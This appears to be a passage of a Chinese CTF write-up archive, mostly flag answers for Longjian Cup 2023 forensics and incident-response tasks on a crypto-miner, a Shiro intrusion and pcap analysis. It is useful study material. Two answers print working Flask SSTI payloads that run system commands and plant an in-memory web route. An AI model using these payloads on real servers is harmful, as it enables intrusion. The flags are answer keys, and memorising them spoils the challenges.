+<p>FLAG：<code>172.105.202.239</code></p>
+<h3 id="server-save_6"><a class="header" href="#server-save_6">server save_6</a></h3>
+<blockquote>
+<p>病毒运行后释放了什么文件？格式：文件1,文件2</p>
+</blockquote>
+<p>FLAG：<code>lolMiner ,mine_doge.sh</code></p>
+<h3 id="server-save_7"><a class="header" href="#server-save_7">server save_7</a></h3>
+<blockquote>
+<p>矿池地址是什么？ 格式：domain:1234</p>
+</blockquote>
+<p><code>mine_doge.sh</code></p>
+<p>FLAG：<code>doge.millpools.cc:5567</code></p>
+<h3 id="server-save_8"><a class="header" href="#server-save_8">server save_8</a></h3>
+<blockquote>
+<p>黑客的钱包地址是多少？格式：xx:xxxxxxxx</p>
+</blockquote>
+<p>FLAG：<code>DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</code></p>
+<h2 id="ws"><a class="header" href="#ws">WS</a></h2>
+<p><a href="https://pan.baidu.com/share/init?surl=SPvbhQ9nw5Wp23TzUHFr_g">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/lykzsNsI">备用下载</a></p>
+<h3 id="wireshark1_1"><a class="header" href="#wireshark1_1">Wireshark1_1</a></h3>
+<blockquote>
+<p>被入侵主机的IP是？</p>
+</blockquote>
+<p>FLAG：<code>192.168.246.28</code></p>
+<h3 id="wireshark1_2"><a class="header" href="#wireshark1_2">Wireshark1_2</a></h3>
+<blockquote>
+<p>被入侵主机的口令是？</p>
+</blockquote>
+<p>FLAG：<code>Youcannevergetthis</code></p>
+<h3 id="wireshark1_3"><a class="header" href="#wireshark1_3">Wireshark1_3</a></h3>
+<blockquote>
+<p>用户目录下第二个文件夹的名称是？</p>
+</blockquote>
+<p>FLAG：<code>Downloads</code></p>
+<h3 id="wireshark1_4"><a class="header" href="#wireshark1_4">Wireshark1_4</a></h3>
+<blockquote>
+<p>/etc/passwd中倒数第二个用户的用户名是？</p>
+</blockquote>
+<p>FLAG：<code>mysql</code></p>
+<h2 id="ir"><a class="header" href="#ir">IR</a></h2>
+<p>本题附件见于平台公告的 IR.zip，解压密码为<code>f0b1ba11478343f404666c355919de3f</code></p>
+<blockquote>
+<p>你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网 IP 是 10.221.36.21。查询 CMDB 后得知该 IP 运行了公司的工时系统。（虚拟机账号密码为：root/IncidentResponsePasswd）</p>
+</blockquote>
+<h3 id="incidentresponse_1"><a class="header" href="#incidentresponse_1">IncidentResponse_1</a></h3>
+<blockquote>
+<p>挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）</p>
+</blockquote>
+<pre><code class="language-bash">echo -n '/etc/redis/redis-server'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>6f72038a870f05cbf923633066e48881</code></p>
+<h3 id="incidentresponse_2"><a class="header" href="#incidentresponse_2">IncidentResponse_2</a></h3>
+<blockquote>
+<p>挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）</p>
+</blockquote>
+<p>在 <code>redis.conf</code> 文件中</p>
+<pre><code class="language-bash">echo -n 'donate.v2.xmrig.com'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>3fca20bb92d0ed67714e68704a0a4503</code></p>
+<h3 id="incidentresponse_3"><a class="header" href="#incidentresponse_3">IncidentResponse_3</a></h3>
+<blockquote>
+<p>攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）
+题目提示：答案 md5 值前两位为 3e</p>
+</blockquote>
+<p>“工时系统”的日志文件 <code>/home/app/nohup.log</code></p>
+<pre><code class="language-bash">echo -n 'shirodeserialization'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>3ee726cb32f87a15d22fe55fa04c4dcd</code></p>
+<h3 id="incidentresponse_4"><a class="header" href="#incidentresponse_4">IncidentResponse_4</a></h3>
+<blockquote>
+<p>攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）</p>
+</blockquote>
+<pre><code class="language-bash">echo -n '81.70.166.3'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>b2c5af8ce08753894540331e5a947d35</code></p>
+<h3 id="incidentresponse_5"><a class="header" href="#incidentresponse_5">IncidentResponse_5</a></h3>
+<blockquote>
+<p>攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）</p>
+</blockquote>
+<p>nginx 日志 <code>access.log</code></p>
+<pre><code class="language-bash">echo -n 'strings'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>6ba8458f11f4044cce7a621c085bb3c6</code></p>
+<h3 id="incidentresponse_6"><a class="header" href="#incidentresponse_6">IncidentResponse_6</a></h3>
+<blockquote>
+<p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）</p>
+</blockquote>
+<pre><code class="language-bash">echo -n '/root/.ssh/authorized_keys'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>a1fa1b5aeb1f97340032971c342c4258</code></p>
+<h3 id="incidentresponse_7"><a class="header" href="#incidentresponse_7">IncidentResponse_7</a></h3>
+<blockquote>
+<p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）</p>
+</blockquote>
+<pre><code class="language-bash">echo -n '/lib/systemd/system/redis.service'|md5sum|cut -d ' ' -f1
+</code></pre>
+<p>FLAG：<code>b2c5af8ce08753894540331e5a947d35</code></p>
+<h2 id="ssw"><a class="header" href="#ssw">SSW</a></h2>
+<pre><code>http and ip.addr ==192.168.77.135 and  ip.addr ==192.168.77.155
+</code></pre>
+<h3 id="smallsword_1"><a class="header" href="#smallsword_1">SmallSword_1</a></h3>
+<blockquote>
+<p>连接蚁剑的正确密码是______________?（答案示例：123asd）</p>
+</blockquote>
+<p>FLAG：<code>6ea280898e404bfabd0ebb702327b18f</code></p>
+<h3 id="smallsword_2"><a class="header" href="#smallsword_2">SmallSword_2</a></h3>
+<blockquote>
+<p>攻击者留存的值是______________?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)</p>
+</blockquote>
+<p>第二次向 <code>hacker.txt</code> 写内容</p>
+<p>FLAG：<code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91</code></p>
+<h3 id="smallsword_3"><a class="header" href="#smallsword_3">SmallSword_3</a></h3>
+<blockquote>
+<p>攻击者下载到的flag是______________?(答案示例：flag3{uuid})</p>
+</blockquote>
+<p>导出 exe 文件，运行后获取 jpg 图片，修复文件后得 flag。</p>
+<p>FLAG：<code>flag3{8f0dffac-5801-44a9-bd49-e66192ce4f57}</code></p>
+<h2 id="ew"><a class="header" href="#ew">EW</a></h2>
+<h3 id="ez_web_1"><a class="header" href="#ez_web_1">ez_web_1</a></h3>
+<blockquote>
+<p>服务器自带的后门文件名是什么？（含文件后缀）</p>
+</blockquote>
+<p>FLAG：<code>ViewMore.php</code></p>
+<h3 id="ez_web_2"><a class="header" href="#ez_web_2">ez_web_2</a></h3>
+<blockquote>
+<p>服务器内网IP是多少？</p>
+</blockquote>
+<p>FLAG：<code>192.168.101.132</code></p>
+<h3 id="ez_web_3"><a class="header" href="#ez_web_3">ez_web_3</a></h3>
+<blockquote>
+<p>攻击者往服务器中写入的key是什么？</p>
+</blockquote>
+<p>解压密码为<code>7e03864b0db7e6f9</code></p>
+<p>FLAG：<code>7d9ddff2-2d67-4eba-9e48-b91c26c42337</code></p>
+<h2 id="bf"><a class="header" href="#bf">BF</a></h2>
+<p>本题附件见于平台公告的 BF.zip，解压密码为 <code>4cf611fce4a2fec305e54c2766b7c860</code></p>
+<p>题目给出了两个文件，分别是磁盘镜像文件<code>baby_forensics.vmdk</code>、内存文件<code>baby_forensics.raw</code>。</p>
+<h3 id="baby_forensics_1"><a class="header" href="#baby_forensics_1">baby_forensics_1</a></h3>
+<blockquote>
+<p>磁盘中的key是多少？</p>
+</blockquote>
+<p><code>key.txt</code> <code>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d</code>进行 ROT47 解密。</p>
+<p><img src="longjiancup/2023/./images/longjincup_2023_bf_2.png" alt="" /></p>
+<p>FLAG：<code>2e80307085fd2b5c49c968c323ee25d5</code></p>
+<h3 id="baby_forensics_2"><a class="header" href="#baby_forensics_2">baby_forensics_2</a></h3>
+<blockquote>
+<p>电脑中正在运行的计算器的运行结果是多少？</p>
+</blockquote>
+<p>FLAG：<code>7598632541</code></p>
+<h3 id="baby_forensics_3"><a class="header" href="#baby_forensics_3">baby_forensics_3</a></h3>
+<blockquote>
+<p>该内存文件中存在的flag值是多少？</p>
+</blockquote>
+<p>一般便签的数据保存目录是在 <code>C:\Users\当前的账户用户名\AppData\Roaming\Microsoft\Sticky Notes\StickyNotes.snt</code> 文件，需将原文件删除，并将我们的文件重命名。</p>
+<pre><code>U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp
+94qfIcjQhDxPgr9G4u++pA==
+</code></pre>
+<p><img src="longjiancup/2023/./images/longjincup_2023_bf_3.png" alt="" /></p>
+<p><code>qwerasdf</code></p>
+<p>使用 CryptoJS 实现的在线网站解密，如<a href="https://tool.oschina.net/encrypt/">https://tool.oschina.net/encrypt/</a></p>
+<p>或者使用 openssl 解密</p>
+<pre><code class="language-bash">echo "U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==" | openssl enc -d -aes-256-cbc -md md5 -base64 -pass pass:qwerasdf
+</code></pre>
+<p>FLAG：<code>flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}</code></p>
+<h2 id="tp"><a class="header" href="#tp">TP</a></h2>
+<h3 id="tcpdump_1"><a class="header" href="#tcpdump_1">tcpdump_1</a></h3>
+<blockquote>
+<p>攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:admin</p>
+</blockquote>
+<pre><code>http &amp;&amp; !tcp contains "用户名或密码错误"
+</code></pre>
+<p>FLAG：<code>TMjpxFGQwD:123457</code></p>
+<h3 id="tcpdump_2"><a class="header" href="#tcpdump_2">tcpdump_2</a></h3>
+<blockquote>
+<p>攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）</p>
+</blockquote>
+<p><code>userid</code></p>
+<pre><code>accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1
+</code></pre>
+<p>FLAG：<code>383c74db4e32513daaa1eeb1726d7255</code></p>
+<h3 id="tcpdump_3"><a class="header" href="#tcpdump_3">tcpdump_3</a></h3>
+<blockquote>
+<p>攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456</p>
+</blockquote>
+<p><img src="longjiancup/2023/./images/longjincup_2023_tcpdump_3.png" alt="longjincup_2023_tcpdump_3" /></p>
+<p>FLAG：<code>zyplayer:1234567</code></p>
+<h3 id="tcpdump_4"><a class="header" href="#tcpdump_4">tcpdump_4</a></h3>
+<blockquote>
+<p>攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.so</p>
+</blockquote>
+<p><img src="longjiancup/2023/./images/longjincup_2023_tcpdump_4.png" alt="longjincup_2023_tcpdump_4" /></p>
+<p>FLAG：<code>CVE-2022-21724:custom.dtd.xml</code></p>
+<h3 id="tcpdump_5"><a class="header" href="#tcpdump_5">tcpdump_5</a></h3>
+<blockquote>
+<p>给出攻击者获取系统权限后，下载的工具的名称，比如nmap</p>
+</blockquote>
+<p>过滤反弹 shell 的流量</p>
+<pre><code>ip.addr==116.62.63.234 &amp;&amp; tcp.port == 9999
+</code></pre>
+<p><img src="longjiancup/2023/./images/longjincup_2023_tcpdump_5.png" alt="longjincup_2023_tcpdump_5" /></p>
+<p>FLAG：<code>fscan</code></p>
+<h2 id="hd"><a class="header" href="#hd">HD</a></h2>
+<h3 id="hacked_1"><a class="header" href="#hacked_1">hacked_1</a></h3>
+<blockquote>
+<p>admIn用户的密码是什么？</p>
+</blockquote>
+<p>AES <a href="https://gchq.github.io/CyberChef/#recipe=URL_Decode(true)From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,true,false)AES_Decrypt(%7B&#x27;option&#x27;:&#x27;UTF8&#x27;,&#x27;string&#x27;:&#x27;l36DoqKUYQP0N7e1&#x27;%7D,%7B&#x27;option&#x27;:&#x27;UTF8&#x27;,&#x27;string&#x27;:&#x27;131b0c8a7a6e072e&#x27;%7D,&#x27;CBC&#x27;,&#x27;Raw&#x27;,&#x27;Raw&#x27;,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;&#x27;%7D,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;&#x27;%7D)&amp;input=S0dNN05JMC9Xdktzd0slMmJQbG1GSWhPNGdxZThqSnpSZE9pMDJHUTB3Wm9vJTNE&amp;ieol=CRLF">解密，Cyberchef</a></p>
+<p>FLAG：<code>flag{WelC0m5_TO_H3re}</code></p>
+<h3 id="hacked_2"><a class="header" href="#hacked_2">hacked_2</a></h3>
+<blockquote>
+<p>app.config['SECRET_KEY']值为多少？</p>
+</blockquote>
+<p>FLAG：<code>ssti_flask_hsfvaldb</code></p>
+<h3 id="hacked_3"><a class="header" href="#hacked_3">hacked_3</a></h3>
+<blockquote>
+<p>flask网站由哪个用户启动？</p>
+</blockquote>
+<p>Flask session 解密</p>
+<p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<pre><code class="language-bash">python .\flask_session_cookie_manager3.py decode -s "ssti_flask_hsfvaldb" -c ".eJwdx1EKwyAMANCrDEGiPz1Ar1KGZBi7gBpplH2Idy_d-3vTDKWrYiGzm2k5vZRUWeo2WsRObkLKeMKeuekoB4RwZvlg1hDg_S917lSeOhAFf0CTRvXp7ytYGPx2EUbnl7drWqqRk11m3cGmKw0.YpIQcw.J5vs8t8bAr0xDIxF6EqUAH2kkLE"
+{'username': "{%if session.update({'flag':lipsum['__globals__']['__getitem__']('os')['popen']('whoami').read()})%}{%endif%}"}
+</code></pre>
+<pre><code class="language-bash">python .\flask_session_cookie_manager3.py decode -s "ssti_flask_hsfvaldb" -c ".eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4"
+{'flag': 'red\n', 'username': "{%if session.update({'flag':lipsum['__globals__']['__getitem__']('os')['popen']('whoami').read()})%}{%endif%}"}
+</code></pre>
+<p>FLAG：<code>red</code></p>
+<h3 id="hacked_4"><a class="header" href="#hacked_4">hacked_4</a></h3>
+<blockquote>
+<p>攻击者写入的内存马的路由名叫什么？（答案里不需要加/）</p>
+</blockquote>
+<pre><code class="language-bash">python .\flask_session_cookie_manager3.py decode -s "ssti_flask_hsfvaldb" -c ".eJx1jUsOgkAQBa-Cs2lJCEbdcQI9A0w6DdMaYjPgfAwJmbsLC1fq7r2kKrWo6NlZGlhValmiE7yNrkS8y9iSeMQaENvYS-jt-kDXwC8S0PtG0TSVZAxulovCezhcreEZigw-Q2hoDWUVXFhk3GXH0xnyRhULoONnZB-wCzP6QN0Dqt_9b1AXsMb_8F10jm3AjdApT0mlNx2uUsY.YpIRHQ.qS_PWmxt4i4cjHYBzDz-rUdTZns"
+{'username': '{{url_for.__globals__[\'__builtins__\'][\'eval\']("app.add_url_rule(\'/Index\', \'Index\', lambda :\'Hello! 123\')",{\'_request_ctx_stack\':url_for.__globals__[\'_request_ctx_stack\'],\'app\':url_for.__globals__[\'current_app\']})}}'}
+</code></pre>
+<p>FLAG：<code>Index</code></p>
+<h2 id="参考资料-1"><a class="header" href="#参考资料-1">参考资料</a></h2>
+<ul>
+<li><a href="https://github.com/CTF-Archives/2023-longjiancup">https://github.com/CTF-Archives/2023-longjiancup</a></li>
+<li><a href="https://xz.aliyun.com/news/12252">https://xz.aliyun.com/news/12252</a></li>
+<li><a href="https://mp.weixin.qq.com/s/Y8Wfs0or4F0nTcYQDiNiIQ">https://mp.weixin.qq.com/s/Y8Wfs0or4F0nTcYQDiNiIQ</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ciscn"><a class="header" href="#ciscn">CISCN</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="第十八届全国大学生信息安全竞赛创新实践能力赛线上初赛"><a class="header" href="#第十八届全国大学生信息安全竞赛创新实践能力赛线上初赛">第十八届全国大学生信息安全竞赛（创新实践能力赛）线上初赛</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="iscc"><a class="header" href="#iscc">ISCC</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="iscc-2025"><a class="header" href="#iscc-2025">ISCC 2025</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="iscc-2024"><a class="header" href="#iscc-2024">ISCC 2024</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="iscc-2023"><a class="header" href="#iscc-2023">ISCC 2023</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="iscc-2022"><a class="header" href="#iscc-2022">ISCC 2022</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="能源网络安全大赛"><a class="header" href="#能源网络安全大赛">能源网络安全大赛</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2025年能源网络安全大赛预赛"><a class="header" href="#2025年能源网络安全大赛预赛">2025年能源网络安全大赛预赛</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2024年能源网络安全大赛团体决赛"><a class="header" href="#2024年能源网络安全大赛团体决赛">2024年能源网络安全大赛团体决赛</a></h1>
+<p>2024 年 6 月 20 日以线下赛形式在江苏宜兴举办了 2024 年能源网络安全大赛团体决赛、个人决赛。</p>
+<p><a href="https://www.cers.org.cn/site/content/b99df959c78fe7974592fd2022032979.html">关于2024年能源网络安全大赛团体决赛结果的公示</a></p>
+<p>赛题附件：<a href="https://pan.baidu.com/s/1tMnVwV9gdGq08Qgt-jh-sg?pwd=id7k#list/path=%2FCTF%20Archive%2F%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B">百度网盘</a></p>
+<h3 id="输配电场景"><a class="header" href="#输配电场景">输配电场景</a></h3>
+<h3 id="能源管理后门查杀"><a class="header" href="#能源管理后门查杀">能源管理后门查杀</a></h3>
+<blockquote>
+<p>能源管理系统Web应用框架被攻击者留下了后门，请定位分析后清理相关后门程序。</p>
+</blockquote>
+<!-- 如果题目有附件，提供附件下载 -->
+<p><a href="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E5%9B%A2%E4%BD%93%E5%86%B3%E8%B5%9B/attachments/Misc/demo.txt">附件下载</a></p>
+<!-- 如果为静态 flag，需写明 flag -->
+<p>FLAG 为<code>flag{}</code></p>
+<h2 id="新能源发电场景"><a class="header" href="#新能源发电场景">新能源发电场景</a></h2>
+<h2 id="智能制造场景"><a class="header" href="#智能制造场景">智能制造场景</a></h2>
+<h2 id="参考资料-2"><a class="header" href="#参考资料-2">参考资料</a></h2>
+<ul>
+<li><a href="https://github.com/i1ikey0u/CTF_2024NYXH_YS-JS/blob/main/01%E8%83%BD%E6%BA%90%E5%8D%8F%E4%BC%9A%E5%A4%A7%E8%B5%9B%E5%9B%A2%E9%98%9F%E5%86%B3%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%92%8CWriteUp.md">https://github.com/i1ikey0u/CTF_2024NYXH_YS-JS/blob/main/01%E8%83%BD%E6%BA%90%E5%8D%8F%E4%BC%9A%E5%A4%A7%E8%B5%9B%E5%9B%A2%E9%98%9F%E5%86%B3%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%92%8CWriteUp.md</a></li>
+<li><a href="https://www.cnblogs.com/wgf4242/p/18259576">https://www.cnblogs.com/wgf4242/p/18259576</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="2024年能源网络安全大赛个人决赛"><a class="header" href="#2024年能源网络安全大赛个人决赛">2024年能源网络安全大赛个人决赛</a></h1>
+<p>2024 年 6 月 20 日以线下赛形式在江苏宜兴举办了 2024 年能源网络安全大赛团体决赛、个人决赛。</p>
+<p><a href="https://www.cers.org.cn/site/content/b99df959c78fe7974592fd2022032979.html">关于2024年能源网络安全大赛团体决赛结果的公示</a></p>
+<p>赛题附件：<a href="https://pan.baidu.com/s/1tMnVwV9gdGq08Qgt-jh-sg?pwd=id7k#list/path=%2FCTF%20Archive%2F%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B">百度网盘</a></p>
+<h2 id="misc-1"><a class="header" href="#misc-1">Misc</a></h2>
+<h3 id="损坏的图片"><a class="header" href="#损坏的图片">损坏的图片</a></h3>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="损坏的图片" /></p>
+<blockquote>
+<p>黑客将系统锁死后，系统上多了一个损坏的图片，据安全专家评估，图片可能隐含了解密系统的密钥，找到损坏图片中隐藏的flag解锁系统吧。</p>
+</blockquote>
+<p>知识点：<code>文件修复</code>、<code>JPG</code>、<code>Python Pickle</code></p>
+<p>将文件头 <code>89 50 4E 47</code> 修改为 <code>FF D8 ff E0</code>，得到 JPG 图片。</p>
+<p><img src="%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_2024_%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9B/./images/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%9B%BE%E7%89%87-recover.jpg" alt="损坏的图片-recover" /></p>
+<p>该图片为巨蟒集团（Monty Python）， 同时发现图片末尾有额外数据，开头为 <code>80 04</code>，疑似为 Python Pickle 反序列化数据。</p>
+<pre><code class="language-python">import pickle
+import matplotlib.pyplot as plt
+
+with open('data.pkl', 'rb') as f:
+    data = pickle.load(f)
+# print(data)
+# 提取数据中的所有点
+points = [(x, i) for i, sublist in enumerate(data) for x, _ in sublist]
+# 调整Y轴的⽐例，翻转图像
+x_vals, y_vals = zip(*points)
+adjusted_y_vals = [-y for y in y_vals]
+
+# 绘制数据点
+plt.figure()
+plt.scatter(x_vals, adjusted_y_vals, marker='X', color='b')
+plt.show()
+</code></pre>
+<p>反序列化后得到的列表及如果如下：</p>
+<pre><code class="language-python">[[(42, 'X'), (43, 'X'), (44, 'X')], [(6, 'X'), (7, 'X'), (41, 'X'), (42, 'X')], [(4, 'X'), (5, 'X'), (11, 'X'), (41, 'X')], [(4, 'X'), (11, 'X'), (41, 'X'), (42, 'X')], [(0, 'X'), (2, 'X'), (4, 'X'), (5, 'X'), (6, 'X'), (7, 'X'), (10, 'X'), (11, 'X'), (17, 'X'), (18, 'X'), (19, 'X'), (20, 'X'), (21, 'X'), (29, 'X'), (30, 'X'), (31, 'X'), (32, 'X'), (33, 'X'), (40, 'X'), (41, 'X'), (42, 'X'), (48, 'X'), (49, 'X'), (50, 'X'), (51, 'X'), (59, 'X'), (60, 'X'), (61, 'X'), (62, 'X')], [(4, 'X'), (10, 'X'), (17, 'X'), (22, 'X'), (29, 'X'), (34, 'X'), (39, 'X'), (40, 'X'), (51, 'X'), (58, 'X'), (59, 'X'), (63, 'X')], [(4, 'X'), (10, 'X'), (17, 'X'), (22, 'X'), (29, 'X'), (30, 'X'), (33, 'X'), (34, 'X'), (40, 'X'), (41, 'X'), (42, 'X'), (48, 'X'), (49, 'X'), (50, 'X'), (51, 'X'), (58, 'X'), (59, 'X'), (60, 'X'), (61, 'X'), (62, 'X'), (63, 'X')], [(4, 'X'), (10, 'X'), (15, 'X'), (17, 'X'), (18, 'X'), (19, 'X'), (20, 'X'), (21, 'X'), (22, 'X'), (23, 'X'), (24, 'X'), (25, 'X'), (26, 'X'), (32, 'X'), (33, 'X'), (34, 'X'), (41, 'X'), (42, 'X'), (48, 'X'), (49, 'X'), (50, 'X'), (51, 'X'), (52, 'X'), (53, 'X'), (54, 'X')], [(4, 'X'), (10, 'X'), (11, 'X'), (12, 'X'), (13, 'X'), (14, 'X'), (15, 'X'), (33, 'X'), (41, 'X')], [(4, 'X'), (32, 'X'), (33, 'X'), (41, 'X')], [(26, 'X'), (27, 'X'), (32, 'X'), (41, 'X'), (42, 'X'), (43, 'X')], [(27, 'X'), (28, 'X'), (29, 'X'), (30, 'X'), (31, 'X'), (42, 'X'), (43, 'X')], [(29, 'X'), (30, 'X')], [], [(13, 'X'), (15, 'X')], [(1, 'X'), (2, 'X'), (3, 'X'), (4, 'X'), (12, 'X'), (13, 'X'), (15, 'X'), (22, 'X'), (23, 'X'), (24, 'X'), (25, 'X'), (26, 'X'), (28, 'X'), (34, 'X'), (39, 'X'), (45, 'X'), (46, 'X'), (47, 'X'), (48, 'X'), (52, 'X'), (53, 'X'), (61, 'X'), (62, 'X')], [(4, 'X'), (11, 'X'), (12, 'X'), (15, 'X'), (22, 'X'), (28, 'X'), (35, 'X'), (38, 'X'), (39, 'X'), (44, 'X'), (45, 'X'), (48, 'X'), (53, 'X'), (61, 'X')], [(0, 'X'), (1, 'X'), (2, 'X'), (3, 'X'), (10, 'X'), (11, 'X'), (12, 'X'), (13, 'X'), (15, 'X'), (16, 'X'), (17, 'X'), (22, 'X'), (28, 'X'), (35, 'X'), (36, 'X'), (37, 'X'), (38, 'X'), (43, 'X'), (44, 'X'), (47, 'X'), (48, 'X'), (53, 'X'), (54, 'X'), (60, 'X')], [(0, 'X'), (1, 'X'), (2, 'X'), (3, 'X'), (4, 'X'), (5, 'X'), (6, 'X'), (7, 'X'), (15, 'X'), (22, 'X'), (28, 'X'), (36, 'X'), (37, 'X'), (43, 'X'), (44, 'X'), (45, 'X'), (46, 'X'), (47, 'X'), (48, 'X'), (54, 'X'), (55, 'X'), (59, 'X')], [(15, 'X'), (22, 'X'), (28, 'X'), (36, 'X'), (48, 'X'), (58, 'X'), (59, 'X')], [(34, 'X'), (35, 'X'), (48, 'X'), (57, 'X'), (58, 'X')], [(32, 'X'), (47, 'X'), (56, 'X'), (57, 'X')], [(31, 'X'), (32, 'X'), (43, 'X'), (44, 'X'), (46, 'X'), (47, 'X'), (55, 'X'), (56, 'X')], [(30, 'X'), (45, 'X'), (54, 'X'), (55, 'X')], [(59, 'X'), (60, 'X'), (61, 'X'), (62, 'X')], [(50, 'X'), (62, 'X')], [(2, 'X'), (3, 'X'), (4, 'X'), (5, 'X'), (6, 'X'), (7, 'X'), (8, 'X'), (9, 'X'), (16, 'X'), (17, 'X'), (18, 'X'), (19, 'X'), (21, 'X'), (22, 'X'), (23, 'X'), (24, 'X'), (25, 'X'), (31, 'X'), (32, 'X'), (33, 'X'), (34, 'X'), (35, 'X'), (36, 'X'), (37, 'X'), (38, 'X'), (39, 'X'), (40, 'X'), (46, 'X'), (49, 'X'), (52, 'X'), (53, 'X'), (62, 'X')], [(7, 'X'), (8, 'X'), (22, 'X'), (23, 'X'), (38, 'X'), (39, 'X'), (47, 'X'), (48, 'X'), (49, 'X'), (51, 'X'), (52, 'X'), (61, 'X')], [(5, 'X'), (6, 'X'), (7, 'X'), (20, 'X'), (21, 'X'), (22, 'X'), (36, 'X'), (37, 'X'), (44, 'X'), (45, 'X'), (46, 'X'), (47, 'X'), (48, 'X'), (49, 'X'), (50, 'X'), (51, 'X'), (53, 'X'), (54, 'X'), (61, 'X'), (62, 'X'), (63, 'X'), (64, 'X'), (65, 'X'), (66, 'X')], [(4, 'X'), (5, 'X'), (18, 'X'), (19, 'X'), (20, 'X'), (32, 'X'), (33, 'X'), (34, 'X'), (35, 'X'), (46, 'X'), (47, 'X'), (48, 'X'), (49, 'X'), (50, 'X'), (51, 'X'), (61, 'X'), (62, 'X'), (63, 'X'), (64, 'X'), (65, 'X')], [(2, 'X'), (3, 'X'), (4, 'X'), (15, 'X'), (16, 'X'), (17, 'X'), (30, 'X'), (31, 'X'), (32, 'X'), (44, 'X'), (45, 'X'), (46, 'X'), (49, 'X'), (51, 